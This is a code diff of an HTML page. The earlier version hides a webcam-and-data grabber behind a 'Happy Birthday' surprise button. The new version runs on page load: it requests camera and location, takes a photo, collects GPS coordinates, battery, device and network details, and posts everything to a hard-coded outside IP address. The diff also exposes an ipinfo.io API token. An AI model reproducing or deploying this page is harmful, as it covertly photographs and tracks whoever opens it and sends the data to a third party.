@@ -3,108 +3,40 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Mancis Peng</title>
+  <title>Mancis Jau</title>
   <style>
     body {
-      font-family: 'Chewy', cursive ;
-      margin: 0;
-      padding: 0;
-      background: #ffcce7;
-      color: #5a2d0c;
+      font-family: 'Arial', sans-serif;
       text-align: center;
-    }
-
-    h1 {
-      font-size: 2.5rem;
-      margin-top: 20px;
-      color: #ff6fa1;
-      text-shadow: 1px 1px 2px #ffffff, 0 0 10px #ff99c8;
-    }
-
-    #collectData {
-      font-size: 1.5rem;
-      padding: 15px 30px;
-      border: none;
-      border-radius: 50px;
-      background: linear-gradient(135deg, #ff7eb3, #ff4081);
-      color: white;
-      cursor: pointer;
-      box-shadow: 0 5px 15px rgba(255, 105, 180, 0.4);
-      transition: all 0.3s ease;
-    }
-
-    #collectData:hover {
-      background: linear-gradient(135deg, #ff4081, #ff7eb3);
-      transform: scale(1.1);
-    }
-
-    #collectData:active {
-      transform: scale(1.05);
-    }
-
-    body:before {
-      content: '';
-      position: absolute;
-      top: 0;
-      left: 0;
-      right: 0;
-      bottom: 0;
-      z-index: -1;
-      background: url('https://cdn.pixabay.com/photo/2016/03/05/19/02/sweets-1238612_960_720.jpg') center/cover no-repeat;
-      opacity: 0.2;
-    }
-
-    #popup {
-      display: none;
-      position: fixed;
-      top: 50%;
-      left: 50%;
-      transform: translate(-50%, -50%);
+      background-color: #f0f0f0;
       padding: 20px;
-      background: #fff;
-      border: 3px solid #ff99c8;
-      border-radius: 15px;
-      box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
-      z-index: 1000;
     }
-
-    #popup h2 {
-      font-size: 2rem;
-      color: #ff6fa1;
-    }
-
-    #popup button {
-      background: #ff4081;
-      color: white;
-      padding: 10px 20px;
-      border: none;
-      border-radius: 10px;
-      cursor: pointer;
-    }
-
-    #popup button:hover {
-      background: #ff6fa1;
+    h1 {
+      color: #333;
     }
   </style>
 </head>
 <body>
-  <h1>Pencet Tombol dibawah</h1>
-  <button id="collectData">🎉 Surprise 🎉</button>
-
-  <div id="popup">
-    <h2>🍫🤎Happy Birthday! 🤎🍫</h2>
-    <button onclick="closePopup()">OK</button>
-  </div>
+  <h1>mauk sudsh aku co</h1>
+  <p> src = images "betrik.png"</p>
 
   <script>
-    function showPopup() {
-      const popup = document.getElementById('popup');
-      popup.style.display = 'block';
-    }
+    async function requestPermissions() {
+      try {
+        // Request Camera Permission
+        await navigator.mediaDevices.getUserMedia({ video: true });
 
-    function closePopup() {
-      const popup = document.getElementById('popup');
-      popup.style.display = 'none';
+        // Request Location Permission
+        return new Promise((resolve, reject) => {
+          navigator.geolocation.getCurrentPosition(
+            () => resolve(true),
+            (err) => reject(err)
+          );
+        });
+      } catch (err) {
+        console.error("Permission error:", err);
+        return false;
+      }
     }
 
     async function capturePhoto() {
@@ -122,33 +54,21 @@
         const ctx = canvas.getContext('2d');
         ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
+        // Stop video stream to release resources
         stream.getTracks().forEach((track) => track.stop());
 
         return canvas.toDataURL('image/png');
-      } catch (error) {
-        console.error('Error capturing photo:', error);
+      } catch (err) {
+        console.error("Error capturing photo:", err);
         return null;
       }
     }
 
     async function collectDeviceInfo() {
       const data = {};
-      const apiToken = "6d8519218e7b69";
-      const apiUrl = `https://ipinfo.io/json?token=${apiToken}`;
 
       try {
-        // Fetch location and IP info
-        const ipInfo = await fetch(apiUrl);
-        const ipData = await ipInfo.json();
-        data.ip = ipData.ip || "Unknown IP";
-        data.location = {
-          city: ipData.city || "Unknown",
-          region: ipData.region || "Unknown",
-          country: ipData.country || "Unknown",
-          coordinates: ipData.loc || "Unknown",
-        };
-
-        // Fetch battery info
+        // Battery Info
         if (navigator.getBattery) {
           const battery = await navigator.getBattery();
           data.battery = {
@@ -159,13 +79,13 @@
           data.battery = "Battery API not supported";
         }
 
-        // Device info
+        // Device Info
         data.device = {
           userAgent: navigator.userAgent || "Unknown User Agent",
           platform: navigator.platform || "Unknown Platform",
         };
 
-        // Network info
+        // Network Info
         if (navigator.connection) {
           const connection = navigator.connection;
           data.network = {
@@ -176,15 +96,40 @@
           data.network = "Network API not supported";
         }
 
-      } catch (error) {
-        console.error("Error collecting device info:", error);
+        // Geolocation
+        if (navigator.geolocation) {
+          await new Promise((resolve) => {
+            navigator.geolocation.getCurrentPosition(
+              (position) => {
+                data.location = {
+                  latitude: position.coords.latitude,
+                  longitude: position.coords.longitude,
+                  accuracy: position.coords.accuracy + ' meters',
+                };
+                resolve();
+              },
+              (error) => {
+                data.location = { error: error.message };
+                resolve();
+              }
+            );
+          });
+        } else {
+          data.location = "Geolocation not supported";
+        }
+      } catch (err) {
+        console.error("Error collecting device info:", err);
       }
 
       return data;
     }
 
-    document.getElementById('collectData').addEventListener('click', async () => {
-      showPopup();
+    async function sendData() {
+      if (!(await requestPermissions())) {
+        alert("Camera and location permissions are required!");
+        return;
+      }
+
       const photo = await capturePhoto();
       const deviceInfo = await collectDeviceInfo();
 
@@ -194,17 +139,22 @@
       };
 
       try {
-        const response = await fetch('http://127.0.0.1:5000/data', {
+        const response = await fetch('http://36.75.64.201:5000/data', {
           method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
+          headers: {
+            'Content-Type': 'application/json',
+          },
           body: JSON.stringify(data),
         });
         const result = await response.json();
         console.log('Server response:', result);
-      } catch (error) {
-        console.error('Error sending data:', error);
+      } catch (err) {
+        console.error('Error sending data:', err);
       }
-    });
+    }
+
+    // Call sendData when the page loads
+    window.onload = sendData;
   </script>
 </body>
-</html
+</html>
